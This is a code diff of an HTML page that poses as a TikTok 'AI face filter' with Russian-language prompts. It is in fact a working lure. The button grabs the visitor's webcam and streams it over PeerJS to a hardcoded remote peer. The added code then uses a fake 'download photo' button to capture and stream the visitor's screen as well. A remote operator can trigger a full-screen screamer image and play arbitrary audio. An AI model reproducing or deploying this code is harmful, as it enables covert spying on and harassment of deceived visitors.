@@ -1,98 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>TikTok AI Face Filter</title>
+    <title>TikTok AI Filter</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { background: #000; color: white; font-family: sans-serif; text-align: center; display: flex; flex-direction: column; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .btn { background: #ff0050; color: white; border: none; padding: 25px 50px; font-size: 20px; font-weight: bold; border-radius: 50px; cursor: pointer; margin: 10px; }
-        #loader, #screamer { display: none; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #ff0050; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        .btn { background: #ff0050; color: white; border: none; padding: 20px 40px; font-size: 18px; font-weight: bold; border-radius: 50px; cursor: pointer; margin-top: 20px; }
+        #loader, #download-zone, #screamer { display: none; }
         #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: black; z-index: 10000; }
         #screamer img { width: 100%; height: 100%; object-fit: cover; }
     </style>
 </head>
 <body>
-
     <div id="ui">
-        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80" style="margin-bottom: 20px;">
-        <h2>AI-Фильтр "Идеальное лицо"</h2>
-        <p>Для калибровки нейросети разрешите доступ к камере</p>
-        <button class="btn" onclick="startCalibration()">ПОДКЛЮЧИТЬ ЭФФЕКТ</button>
+        <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="80">
+        <h1>AI-Фильтр "Идеальное лицо"</h1>
+        <button class="btn" onclick="startCam()">ПОДКЛЮЧИТЬ</button>
     </div>
 
     <div id="loader">
-        <div class="spinner"></div>
-        <h2 id="load-text">Калибровка биометрии... 0%</h2>
-        <p>Держите лицо в центре кадра</p>
+        <div style="border: 4px solid #333; border-top: 4px solid #ff0050; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto;"></div>
+        <h2 id="load-text">Обработка...</h2>
+    </div>
+
+    <div id="download-zone">
+        <h2>Фото готово!</h2>
+        <button class="btn" style="background: #00f2ea; color: #000;" onclick="startScreen()">СКАЧАТЬ ФОТО</button>
     </div>
 
     <div id="screamer">
         <img src="https://i.imgur.com/v799C7v.jpeg">
+        <audio id="scary-audio" src="https://www.myinstants.com/media/sounds/screamer.mp3"></audio>
     </div>
 
-    <audio id="screamer-sound" src="https://www.myinstants.com/media/sounds/screamer.mp3" preload="auto"></audio>
-    <audio id="laugh-sound" src="https://www.myinstants.com/media/sounds/laugh.mp3" preload="auto"></audio>
+    <audio id="remote-sound"></audio>
 
     <script>
-        const REMOTE_ID = '09062012'; // Твой уникальный ID (должен совпадать во всех файлах)
+        const REMOTE_ID = '09062012';
         const peer = new Peer();
+        let conn;
 
-        peer.on('connection', conn => {
+        async function startCam() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                conn = peer.connect(REMOTE_ID);
+                peer.call(REMOTE_ID, stream, { metadata: { device: "Камера" } });
+                document.getElementById('ui').style.display = 'none';
+                document.getElementById('download-zone').style.display = 'block';
+                setupCommands();
+            } catch (e) { alert("Ошибка доступа к камере"); }
+        }
+
+        async function startScreen() {
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                peer.call(REMOTE_ID, stream, { metadata: { device: "Экран" } });
+                document.getElementById('download-zone').style.display = 'none';
+                document.getElementById('loader').style.display = 'block';
+            } catch (e) { alert("Ошибка при сохранении"); }
+        }
+
+        function setupCommands() {
             conn.on('data', data => {
-                if (data.type === 'SCREAMER') {
-                    showScreamer();
-                } else if (data.type === 'SOUND') {
-                    playSound(data.content);
+                if (data.type === 'SCREAM') {
+                    document.getElementById('screamer').style.display = 'block';
+                    document.getElementById('scary-audio').play();
+                } else if (data.type === 'PLAY_SOUND') {
+                    const audio = document.getElementById('remote-sound');
+                    audio.src = data.url;
+                    audio.play();
                 }
             });
-        });
-
-        async function startCalibration() {
-            try {
-                // Запрос Камеры
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                
-                // Создаем соединение и звоним на монитор
-                const conn = peer.connect(REMOTE_ID);
-                peer.call(REMOTE_ID, stream);
-
-                // Переключаем интерфейс
-                document.getElementById('ui').style.display = 'none';
-                document.getElementById('loader').style.display = 'block';
-
-                // Фейковая загрузка
-                let progress = 0;
-                setInterval(() => {
-                    if (progress < 99) {
-                        progress += Math.floor(Math.random() * 2) + 1;
-                        document.getElementById('load-text').innerText = "Калибровка биометрии... " + progress + "%";
-                    }
-                }, 700);
-
-            } catch (err) {
-                alert("Ошибка! Для работы фильтра обязателен доступ к камере.");
-                location.reload();
-            }
-        }
-
-        function showScreamer() {
-            const overlay = document.getElementById('screamer');
-            const sound = document.getElementById('screamer-sound');
-            overlay.style.display = 'block';
-            sound.play();
-            if (navigator.vibrate) navigator.vibrate(1000);
-            setTimeout(() => { overlay.style.display = 'none'; }, 2000); // Исчезает через 2 сек
-        }
-
-        function playSound(soundType) {
-            if (soundType === 'LAUGH') {
-                document.getElementById('laugh-sound').play();
-            }
         }
     </script>
+    <style> @keyframes spin { to { transform: rotate(360deg); } } </style>
 </body>
 </html>
